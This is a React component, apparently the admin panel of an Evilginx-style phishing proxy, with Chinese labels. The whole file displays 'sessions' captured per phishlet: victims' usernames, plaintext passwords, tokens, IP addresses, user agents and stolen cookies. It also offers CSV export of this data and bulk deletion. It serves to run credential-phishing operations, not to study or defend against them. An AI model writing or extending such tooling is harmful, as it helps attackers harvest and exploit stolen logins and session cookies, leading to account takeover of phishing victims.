// Sessions.jsx
import React, { useEffect, useState } from 'react'
import axios from 'axios'
import { downloadCSV } from '../utils'

import {
  CCard,
  CCardBody,
  CCol,
  CRow,
  CFormInput,
  CButton,
  CTable,
  CTableBody,
  CTableDataCell,
  CTableHead,
  CTableHeaderCell,
  CTableRow,
  CPagination,
  CPaginationItem,
  CFormCheck,
  CModal,
  CModalHeader,
  CModalTitle,
  CModalBody,
  CModalFooter,
  CFormSelect,
} from '@coreui/react'

const Sessions = () => {
  const [sessions, setSessions] = useState([])
  const [filtered, setFiltered] = useState([])
  const [search, setSearch] = useState('')
  const [phishletFilter, setPhishletFilter] = useState('ALL')

  // 分页
  const [page, setPage] = useState(1)
  const pageSize = 10

  // 选中的 Session ID
  const [selectedIds, setSelectedIds] = useState([])

  // 弹窗
  const [showModal, setShowModal] = useState(false)
  const [modalCookies, setModalCookies] = useState('')

  // 加载数据
  useEffect(() => {
    axios.get('/api/sessions')
      .then((res) => {
        const data = res.data || []
        setSessions(data)
        setFiltered(data)
      })
      .catch((err) => {
        console.error('Failed to load sessions:', err)
      })
  }, [])

  // 搜索 & 下拉过滤
  useEffect(() => {
    const keyword = search.toLowerCase()
    let newFiltered = sessions.filter((s) =>
      s.username?.toLowerCase().includes(keyword) ||
      s.phishlet?.toLowerCase().includes(keyword) ||
      s.remote_addr?.toLowerCase().includes(keyword),
    )
    if (phishletFilter !== 'ALL') {
      newFiltered = newFiltered.filter((s) => s.phishlet === phishletFilter)
    }
    setFiltered(newFiltered)
    setPage(1)
  }, [search, phishletFilter, sessions])

  // 分页
  const paged = filtered.slice((page - 1) * pageSize, page * pageSize)
  const totalPages = Math.ceil(filtered.length / pageSize)

  // 判断某行是否被选中
  const isChecked = (id) => selectedIds.includes(id)

  // 点击单个复选框
  const handleCheckboxChange = (id) => {
    setSelectedIds((prev) => {
      if (prev.includes(id)) {
        return prev.filter((x) => x !== id)
      } else {
        return [...prev, id]
      }
    })
  }

  // “全选”表头复选框
  const isAllChecked = filtered.length > 0 && selectedIds.length === filtered.length

  const handleSelectAll = (e) => {
    if (e.target.checked) {
      // 全选当前过滤列表
      const allIds = filtered.map((s) => s.id)
      setSelectedIds(allIds)
    } else {
      // 全部取消
      setSelectedIds([])
    }
  }

  // 批量删除
  const handleDeleteSelected = () => {
    if (selectedIds.length === 0) {
      alert('请先选中要删除的 Session')
      return
    }
    axios.delete('/api/sessions', {
      data: { ids: selectedIds },
    })
      .then(() => {
        const newAll = sessions.filter((s) => !selectedIds.includes(s.id))
        setSessions(newAll)
        setFiltered(newAll)
        setSelectedIds([])
        alert('批量删除完成!')
      })
      .catch((err) => {
        console.error('批量删除失败:', err)
        alert('批量删除失败，请查看控制台')
      })
  }

  // 查看Cookies
  const handleShowCookies = (session) => {
    if (!session.cookies_json) {
      setModalCookies('No cookies found.')
      setShowModal(true)
      return
    }
    try {
      const parsed = JSON.parse(session.cookies_json)
      const pretty = JSON.stringify(parsed, null, 2)
      setModalCookies(pretty)
    } catch (e) {
      console.error('parse error:', e)
      setModalCookies(session.cookies_json)
    }
    setShowModal(true)
  }

  // 关闭弹窗
  const handleCloseModal = () => {
    setShowModal(false)
    setModalCookies('')
  }

  // 生成下拉框选项
  const phishletOptions = Array.from(new Set(sessions.map((s) => s.phishlet)))
  const selectOptions = ['ALL', ...phishletOptions]

  return (
    <div style={{ padding: 24 }}>
      <h3 className="mb-4">最近活动 Sessions</h3>

      {/* 头部筛选 & 按钮区域 */}
      <CRow className="mb-3 align-items-center">
        <CCol sm={4}>
          <CFormInput
            type="text"
            placeholder="搜索用户名 / IP / Phishlet"
            value={search}
            onChange={(e) => setSearch(e.target.value)}
          />
        </CCol>
        <CCol sm={3}>
          <CFormSelect
            value={phishletFilter}
            onChange={(e) => setPhishletFilter(e.target.value)}
          >
            {selectOptions.map((opt) => (
              <option key={opt} value={opt}>
                {opt === 'ALL' ? '全部Phishlet' : opt}
              </option>
            ))}
          </CFormSelect>
        </CCol>
        <CCol sm={5} className="d-flex justify-content-end gap-2">
          <CButton color="success" onClick={() => downloadCSV(filtered)}>
            导出 CSV
          </CButton>
          <CButton color="danger" onClick={handleDeleteSelected}>
            删除选中
          </CButton>
        </CCol>
      </CRow>

      <CCard>
        <CCardBody>
          <CTable striped responsive>
            <CTableHead>
              <CTableRow>
                {/* 表头“全选” */}
                <CTableHeaderCell>
                  <CFormCheck
                    checked={isAllChecked}
                    onChange={handleSelectAll}
                  />
                </CTableHeaderCell>
                <CTableHeaderCell>ID</CTableHeaderCell>
                <CTableHeaderCell>Phishlet</CTableHeaderCell>
                <CTableHeaderCell>用户名</CTableHeaderCell>
                <CTableHeaderCell>密码</CTableHeaderCell>
                <CTableHeaderCell>Token</CTableHeaderCell>
                <CTableHeaderCell>IP</CTableHeaderCell>
                <CTableHeaderCell>User-Agent</CTableHeaderCell>
                <CTableHeaderCell>操作</CTableHeaderCell>
              </CTableRow>
            </CTableHead>
            <CTableBody>
              {paged.map((s) => (
                <CTableRow key={s.id}>
                  <CTableDataCell>
                    <CFormCheck
                      checked={isChecked(s.id)}
                      onChange={() => handleCheckboxChange(s.id)}
                    />
                  </CTableDataCell>
                  <CTableDataCell>{s.id}</CTableDataCell>
                  <CTableDataCell>{s.phishlet}</CTableDataCell>
                  <CTableDataCell>{s.username}</CTableDataCell>
                  <CTableDataCell>{s.password}</CTableDataCell>
                  <CTableDataCell>{s.token}</CTableDataCell>
                  <CTableDataCell>{s.remote_addr}</CTableDataCell>
                  <CTableDataCell>{s.useragent}</CTableDataCell>
                  <CTableDataCell>
                    <CButton
                      color="primary"
                      variant="outline"
                      size="sm"
                      onClick={() => handleShowCookies(s)}
                    >
                      查看Cookies
                    </CButton>
                  </CTableDataCell>
                </CTableRow>
              ))}
            </CTableBody>
          </CTable>

          {/* 分页控件 */}
          <CPagination align="center" className="mt-4">
            {Array.from({ length: totalPages }).map((_, i) => (
              <CPaginationItem
                key={i + 1}
                active={page === i + 1}
                onClick={() => setPage(i + 1)}
              >
                {i + 1}
              </CPaginationItem>
            ))}
          </CPagination>
        </CCardBody>
      </CCard>

      {/* 弹窗显示Cookies */}
      <CModal visible={showModal} onClose={handleCloseModal} size="lg">
        <CModalHeader>
          <CModalTitle>Cookies</CModalTitle>
        </CModalHeader>
        <CModalBody>
          <pre
            style={{
              background: '#f9f9f9',
              color: '#333',
              padding: '1rem',
              borderRadius: '4px',
              maxHeight: '400px',
              overflow: 'auto',
              fontSize: '0.9rem',
            }}
          >
            {modalCookies}
          </pre>
        </CModalBody>
        <CModalFooter>
          <CButton color="secondary" onClick={handleCloseModal}>
            关闭
          </CButton>
        </CModalFooter>
      </CModal>
    </div>
  )
}

export default Sessions
